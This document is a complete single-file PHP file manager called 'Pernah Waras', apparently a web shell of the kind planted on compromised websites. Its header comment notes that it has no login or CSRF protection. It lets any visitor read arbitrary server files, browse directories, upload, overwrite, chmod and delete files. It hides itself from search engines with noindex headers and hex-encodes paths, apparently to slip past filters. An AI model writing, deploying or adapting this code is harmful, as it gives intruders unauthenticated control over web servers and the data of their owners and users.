<?php
/*
  Pernah waras — File Manager (single-file)
  Purpose: simple file manager without command runner, login, and CSRF
*/

/* ----------------- POLYFILLS / BACKWARDS COMPAT ----------------- */
/* session_status polyfill for older PHP */
if (!function_exists('session_status')) {
    if (!defined('PHP_SESSION_ACTIVE')) define('PHP_SESSION_ACTIVE', 2);
    if (!defined('PHP_SESSION_NONE')) define('PHP_SESSION_NONE', 1);
    function session_status() {
        return session_id() === '' ? PHP_SESSION_NONE : PHP_SESSION_ACTIVE;
    }
}

if (!function_exists('header_remove')) {
    function header_remove($name = null) {
        // noop for older PHP
        return;
    }
}

function safe_base64_decode($data) {
    if (!is_string($data)) return false;
    if (function_exists('base64_decode') && version_compare(PHP_VERSION, '5.2.0', '>=')) {
        $decoded = base64_decode($data, true);
        if ($decoded !== false) return $decoded;
        // fallback: try decode then verify
        $maybe = base64_decode($data);
        if ($maybe === false) return false;
        if (base64_encode($maybe) === str_replace(array("\r","\n"),'', $data)) return $maybe;
        return false;
    } else {
        // Very old PHP: best-effort
        $maybe = base64_decode($data);
        return $maybe === false ? false : $maybe;
    }
}

/* --------------- ENV / STABILIZER --------------- */
@header_remove();
header('X-Robots-Tag: noindex, nofollow, noarchive, nosnippet, noimageindex', true);
header('Referrer-Policy: no-referrer', true);
header('X-Frame-Options: DENY', true);
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0', true);
header('Pragma: no-cache', true);
header('Expires: 0', true);
header('Content-Type: text/html; charset=UTF-8', true);
header('X-Content-Type-Options: nosniff', true);
header('X-XSS-Protection: 1; mode=block', true);
header('Strict-Transport-Security: max-age=63072000; includeSubDomains; preload', true);

/* ----------------- UTIL & SAFE HELPERS ----------------- */
function strToHex($s){ $h=''; for($i=0;$i<strlen($s);$i++) $h.=sprintf("%02x",ord($s[$i])); return $h; }
function hexToStr($h){ $s=''; for($i=0;$i<strlen($h);$i+=2) $s.=chr(hexdec($h[$i].$h[$i+1])); return $s; }
function formatSize($s){ $u=array('B','KB','MB','GB','TB'); $i=0; while($s>=1024&&$i<4){ $s/=1024; $i++; } return round($s,2).' '.$u[$i]; }
function getFileDetails($p){ $f=array(); $d=array(); $i=@scandir($p); if(!is_array($i)) return array(); foreach($i as $it){ if($it=='.'||$it=='..') continue; $fp=rtrim($p,'/').'/'.$it; $det=array('name'=>$it,'type'=>is_dir($fp)?'Folder':'File','size'=>is_dir($fp)?'':formatSize(@filesize($fp)),'permission'=>@substr(sprintf('%o',@fileperms($fp)),-4)); if(is_dir($fp)) $d[]=$det; else $f[]=$det; } return array_merge($d,$f); }
function changeDirectory($p){ $p==='..'?@chdir('..'):@chdir($p); }
function getCurrentDirectory(){ $rp = realpath(getcwd()); return $rp ? $rp : getcwd(); }
function getLink($p,$n){ return is_dir($p) ? '<a href="?dir='.urlencode(strToHex($p)).'">'.htmlspecialchars($n).'</a>' : '<a href="#" onclick="openEditModalHex(\''.urlencode(strToHex($p)).'\'); return false;">'.htmlspecialchars($n).'</a>'; }
function showBreadcrumb($p){ $p=str_replace('\\','/',$p); $paths=explode('/',$p); echo'<div class="breadcrumb"><a href="?dir='.urlencode(strToHex('/')).'">/</a>'; $acc=''; foreach($paths as $pa){ if($pa==='') continue; $acc.='/'.$pa; echo'<a href="?dir='.urlencode(strToHex($acc)).'">'.htmlspecialchars($pa).'</a>/'; } echo'</div>'; }

/* create file with guaranteed non-zero content */
function create_nonzero_file($path,$userContent=null){
    $default="Created by Pernah Waras file manager @ ".date('c')."\n";
    $payload = ($userContent !== null && $userContent !== '') ? $userContent : $default;
    if (@file_put_contents($path,$payload,LOCK_EX) > 0) return array(true,'file_put_contents');
    if ($fp=@fopen($path,'wb')){ $w=@fwrite($fp,$payload); @fclose($fp); if($w>0) return array(true,'fopen+fwrite'); }
    if ($tmp=@tempnam(sys_get_temp_dir(),'asli_')){ @file_put_contents($tmp,$payload); if(@rename($tmp,$path)||@copy($tmp,$path)){ @unlink($tmp); if(@filesize($path)>0) return array(true,'tempnam+rename/copy'); } @unlink($tmp); }
    if ($src=@fopen('php://temp','wb+')){ @fwrite($src,$payload); @rewind($src); if($dst=@fopen($path,'wb')){ $copied=@stream_copy_to_stream($src,$dst); @fclose($dst); if($copied>0){ @fclose($src); return array(true,'php://temp copy'); } } @fclose($src); }
    if (@touch($path) && @file_put_contents($path,$payload,FILE_APPEND) > 0) return array(true,'touch+append');
    return array(false,'All methods failed');
}

/* ----------------- REQUEST HANDLING ----------------- */

// initial directory
$curDir = getCurrentDirectory();
$msg = '';

// GET helpers
if (isset($_GET['get_filename'])) { echo basename(hexToStr($_GET['get_filename'])); exit; }
if (isset($_GET['ambil-lc-cok'])) { $f = hexToStr($_GET['ambil-lc-cok']); if (file_exists($f)) echo @file_get_contents($f); exit; }
if (isset($_GET['dir'])) { changeDirectory(hexToStr($_GET['dir'])); $curDir = getCurrentDirectory(); }

// POST actions — tanpa CSRF
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // create folder
    if (isset($_POST['new_folder']) && !empty($_POST['folder_name'])) {
        $nf = $curDir . '/' . basename($_POST['folder_name']);
        if (!file_exists($nf)) @mkdir($nf,0755,true);
        $msg = 'Folder created.';
    }
    // create file
    if (isset($_POST['new_file']) && !empty($_POST['file_name'])) {
        $fp = $curDir . '/' . basename($_POST['file_name']);
        $file_content = isset($_POST['file_content']) ? $_POST['file_content'] : null;
        list($s,$m) = create_nonzero_file($fp, $file_content);
        $msg = $s ? "File created using $m." : "Failed to create file.";
    }
    // upload
    if (isset($_POST['upload_file']) && isset($_FILES['uploaded_file'])) {
        $targetPath = $curDir . '/' . basename($_FILES['uploaded_file']['name']);
        $tmpFile = $_FILES['uploaded_file']['tmp_name'];
        if (is_uploaded_file($tmpFile) && @filesize($tmpFile) > 0) {
            if (@move_uploaded_file($tmpFile, $targetPath)) {
                $msg = 'File uploaded successfully (move_uploaded_file).';
            } else {
                $content = @file_get_contents($tmpFile);
                list($success,$method) = create_nonzero_file($targetPath, $content);
                $msg = $success ? "File uploaded using fallback ($method)." : "Upload failed (fallback failed).";
            }
        } else {
            list($success,$method) = create_nonzero_file($targetPath, "Upload placeholder @ ".date('c'));
            $msg = $success ? "Empty upload handled, file created using $method." : "Upload failed (empty file).";
        }
    }
    // edit/save
    if (isset($_POST['edit_file'])) {
        $f = hexToStr($_POST['edit_file']);
        if (file_exists($f) && is_writable($f)) {
            $c = isset($_POST['content']) ? $_POST['content'] : '';
            if (isset($_POST['mode']) && $_POST['mode'] === 'b64') {
                // only accept strict base64 (PHP 5.2.0+ with second arg)
                $dec = safe_base64_decode($c);
                if ($dec === false) { $msg = 'Save failed: invalid Base64 data'; }
                else { list($success,$method) = create_nonzero_file($f, $dec); $msg = $success ? "File edited using $method." : "Failed to edit file."; }
            } else {
                list($success,$method) = create_nonzero_file($f, $c);
                $msg = $success ? "File edited using $method." : "Failed to edit file.";
            }
        } else {
            $msg = 'Save failed (file not writable or missing).';
        }
    }
    // rename
    if (isset($_POST['rename_path']) && !empty($_POST['new_name'])) {
        $old = hexToStr($_POST['rename_path']); $new = basename($_POST['new_name']);
        if ($old && $new && file_exists($old)) @rename($old, dirname($old).'/'.$new);
        $msg = 'Renamed.';
    }
    // chmod
    if (isset($_POST['chmod_path']) && !empty($_POST['chmod_value'])) {
        $path = hexToStr($_POST['chmod_path']);
        $perm = intval($_POST['chmod_value'],8);
        if (file_exists($path)) @chmod($path, $perm);
        $msg = 'Permission changed.';
    }
    // delete
    if (isset($_POST['delete_path'])) {
        $f = hexToStr($_POST['delete_path']);
        if (is_file($f)) @unlink($f);
        elseif (is_dir($f)) {
            $fs = @glob($f.'/*');
            if (is_array($fs)) {
                foreach($fs as $fi) is_dir($fi) ? @rmdir($fi) : @unlink($fi);
            }
            @rmdir($f);
        }
        $msg = 'Deleted.';
    }
    // other actions fall through
}

/* ----------------- HTML / UI ----------------- */
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Pernah Waras — File Manager</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body{font-family:system-ui,Segoe UI,Arial; margin:18px; background:#f7fafc; color:#222}
h1{margin:0 0 12px}
.breadcrumb a{color:#1f6feb;text-decoration:none;margin-right:6px}
.toolbar{display:flex;flex-wrap:wrap;gap:10px;margin-bottom:14px}
.toolbar form{background:#fff;padding:8px;border-radius:8px;border:1px solid #e6e6e6}
input[type=text],textarea,input[type=file]{padding:8px;border:1px solid #d1d5db;border-radius:6px}
button.button{background:#0ea5e9;color:#fff;border:0;padding:8px 12px;border-radius:6px;cursor:pointer}
table{width:100%;border-collapse:collapse;background:#fff;border-radius:8px;overflow:hidden}
th,td{padding:10px;text-align:left}
th{background:#0ea5e9;color:#fff}
tr:nth-child(even){background:#f3f4f6}
.modal{display:none}
#notification{display:none;padding:10px;background:#059669;color:#fff;border-radius:6px;position:fixed;top:18px;right:18px}

/* --- improved modal styling so it always appears above content --- */
.modal {
    display:none;
    position:fixed;
    top:50%;
    left:50%;
    transform:translate(-50%,-50%);
    background:#fff;
    padding:20px;
    border:1px solid #ccc;
    border-radius:8px;
    z-index:9999;
    width:88%;
    max-width:880px;
    box-shadow:0 8px 30px rgba(0,0,0,0.3);
}
.modal h3{margin-top:0}
.modal .modal-controls{display:flex;gap:8px;margin-top:10px;align-items:center}
.overlay {
    display:none;
    position:fixed;
    inset:0;
    background:rgba(0,0,0,0.45);
    z-index:9998;
}
</style>
</head>
<body>
<h1>Pernah Waras — File Manager</h1>
<?php if ($msg) echo '<div id="notification">'.htmlspecialchars($msg).'</div>'; ?>
<?php showBreadcrumb($curDir); ?>

<div class="toolbar">
<form method="get">
    <?php // home/get dir ?>
    <button type="submit" class="button">Home</button>
</form>

<form method="post">
    <input type="text" name="folder_name" placeholder="New Folder Name">
    <button type="submit" name="new_folder" class="button">Create Folder</button>
</form>

<form method="post">
    <input type="text" name="file_name" placeholder="New File Name">
    <textarea name="file_content" rows="2" placeholder="Optional initial content"></textarea>
    <button type="submit" name="new_file" class="button">Create File</button>
</form>

<form method="post" enctype="multipart/form-data">
    <input type="file" name="uploaded_file" required>
    <button type="submit" name="upload_file" class="button">Upload</button>
</form>
</div>

<table>
<thead><tr><th>Name</th><th>Type</th><th>Size</th><th>Permission</th><th>Actions</th></tr></thead>
<tbody>
<?php foreach (getFileDetails($curDir) as $f): 
    $full = $curDir . '/' . $f['name'];
?>
<tr>
    <td><?php echo getLink($full, $f['name']); ?></td>
    <td><?php echo htmlspecialchars($f['type']); ?></td>
    <td><?php echo htmlspecialchars($f['size']); ?></td>
    <td><?php echo htmlspecialchars($f['permission']); ?></td>
    <td>
        <a href="#" onclick="openEditModalHex('<?php echo urlencode(strToHex($full)); ?>'); return false;">Edit</a> |
        <a href="#" onclick="openRenameModal('<?php echo urlencode(strToHex($full)); ?>'); return false;">Rename</a> |
        <a href="#" onclick="openChmodModal('<?php echo urlencode(strToHex($full)); ?>'); return false;">Chmod</a> |
        <a href="#" onclick="openDeleteModal('<?php echo urlencode(strToHex($full)); ?>'); return false;">Delete</a>
    </td>
</tr>
<?php endforeach; ?>
</tbody>
</table>

<!-- overlay (dark background) -->
<div id="overlay" class="overlay" onclick="closeAllModals()"></div>

<!-- EDIT MODAL (improved, foolproof) -->
<div id="editModal" class="modal" role="dialog" aria-modal="true" aria-labelledby="editTitle">
  <h3 id="editTitle">Edit File: <span id="modal-filename"></span></h3>
  <form method="post" id="editForm">
    <input type="hidden" name="edit_file" id="modal-filepath">
    <label>Mode: </label>
    <select id="modal-mode" name="mode">
      <option value="">Text</option>
      <option value="b64">Base64</option>
    </select>
    <div style="margin-top:10px;">
      <textarea name="content" id="modal-textarea" rows="18" style="width:100%;font-family:monospace;"></textarea>
    </div>
    <div class="modal-controls">
      <button type="submit" class="button">Save</button>
      <button type="button" onclick="closeEditModal()" class="button" style="background:#6b7280;">Cancel</button>
      <span style="margin-left:auto;font-size:0.9em;color:#555">Tip: gunakan Base64 jika file biner</span>
    </div>
  </form>
</div>

<!-- RENAME -->
<div id="renameModal" class="modal">
  <h3>Rename</h3>
  <form method="post">
    <input type="hidden" name="rename_path" id="rename-path">
    <input type="text" name="new_name" id="rename-input" placeholder="New Name">
    <div class="modal-controls">
      <button type="submit" class="button">Rename</button>
      <button type="button" onclick="closeRenameModal()" class="button" style="background:#6b7280;">Cancel</button>
    </div>
  </form>
</div>

<!-- CHMOD -->
<div id="chmodModal" class="modal">
  <h3>Change Permission</h3>
  <form method="post">
    <input type="hidden" name="chmod_path" id="chmod-path">
    <input type="text" name="chmod_value" id="chmod-input" placeholder="e.g., 0755">
    <div class="modal-controls">
      <button type="submit" class="button">Change</button>
      <button type="button" onclick="closeChmodModal()" class="button" style="background:#6b7280;">Cancel</button>
    </div>
  </form>
</div>

<!-- DELETE -->
<div id="deleteModal" class="modal">
  <h3>Delete</h3>
  <form method="post">
    <input type="hidden" name="delete_path" id="delete-path">
    <div class="modal-controls">
      <button type="submit" class="button" style="background:#dc2626;">Delete</button>
      <button type="button" onclick="closeDeleteModal()" class="button" style="background:#6b7280;">Cancel</button>
    </div>
  </form>
</div>

<script>
function showNotification(msg){
    var n=document.getElementById('notification');
    if(!n){
        n=document.createElement('div'); n.id='notification'; n.style.cssText='display:block;padding:10px;background:#059669;color:#fff;border-radius:6px;position:fixed;top:18px;right:18px;';
        document.body.appendChild(n);
    }
    n.innerText=msg;
    n.style.display='block';
    setTimeout(function(){ n.style.display='none'; },3000);
}
<?php if ($msg) echo "showNotification(".json_encode($msg).");"; ?>

/* Modal helpers */
var overlay = document.getElementById('overlay');
var editModal = document.getElementById('editModal');
var modalTextarea = document.getElementById('modal-textarea');
var modalMode = document.getElementById('modal-mode');
var modalFilepath = document.getElementById('modal-filepath');
var modalFilename = document.getElementById('modal-filename');
var renameModal = document.getElementById('renameModal');
var chmodModal = document.getElementById('chmodModal');
var deleteModal = document.getElementById('deleteModal');

function openOverlay(){ overlay.style.display='block'; }
function closeOverlay(){ overlay.style.display='none'; }

function openEditModalHex(hexPath){
    // show overlay/modal immediately to ensure user sees popup
    openOverlay();
    editModal.style.display='block';
    modalFilepath.value = hexPath;

    // set filename (best-effort)
    fetch('?get_filename='+hexPath)
        .then(function(r){ return r.text(); })
        .then(function(fn){
            modalFilename.innerText = fn;
        })
        .catch(function(){ modalFilename.innerText = '[Unknown]'; });

    // fetch file contents; if fails, show placeholder but keep modal open
    fetch('?ambil-lc-cok='+hexPath)
        .then(function(r){ return r.text(); })
        .then(function(content){
            modalTextarea.value = content;
            // reset mode to Text for safety (user can change)
            modalMode.value = '';
        })
        .catch(function(){
            modalTextarea.value = '[Gagal membaca file — mungkin permission atau file tidak ada]';
            modalMode.value = '';
        });

    // focus textarea after tiny delay
    setTimeout(function(){ try{ modalTextarea.focus(); }catch(e){} },150);
}

function closeEditModal(){
    editModal.style.display='none';
    closeOverlay();
}

function openRenameModal(path){
    openOverlay();
    document.getElementById('rename-path').value = path;
    fetch('?get_filename=' + path).then(function(r){ return r.text(); }).then(function(fn){ document.getElementById('rename-input').placeholder = fn; }).catch(function(){});
    renameModal.style.display='block';
}
function closeRenameModal(){ renameModal.style.display='none'; closeOverlay(); }

function openChmodModal(path){
    openOverlay();
    document.getElementById('chmod-path').value = path;
    fetch('?get_filename=' + path).then(function(r){ return r.text(); }).then(function(fn){ document.getElementById('chmod-input').placeholder = fn; }).catch(function(){});
    chmodModal.style.display='block';
}
function closeChmodModal(){ chmodModal.style.display='none'; closeOverlay(); }

function openDeleteModal(path){
    openOverlay();
    document.getElementById('delete-path').value = path;
    deleteModal.style.display='block';
}
function closeDeleteModal(){ deleteModal.style.display='none'; closeOverlay(); }

function closeAllModals(){
    closeEditModal();
    closeRenameModal();
    closeChmodModal();
    closeDeleteModal();
}

/* Base64 mode handling (client-side convert) */
if (modalMode) {
    try {
        modalMode.addEventListener('change', function(){
            var val = modalTextarea.value || '';
            if (!val) return;
            try {
                if (modalMode.value === 'b64') {
                    // convert raw text -> base64
                    modalTextarea.value = btoa(unescape(encodeURIComponent(val)));
                } else {
                    // convert base64 -> text (if possible)
                    modalTextarea.value = decodeURIComponent(escape(atob(val)));
                }
            } catch(e){
                alert('Base64 conversion error: ' + (e.message || 'invalid input'));
            }
        });
    } catch(e){}
}

/* Close modal with ESC */
document.addEventListener('keydown', function(e){
    if (e.key === 'Escape') closeAllModals();
});
</script>
</body>
</html>
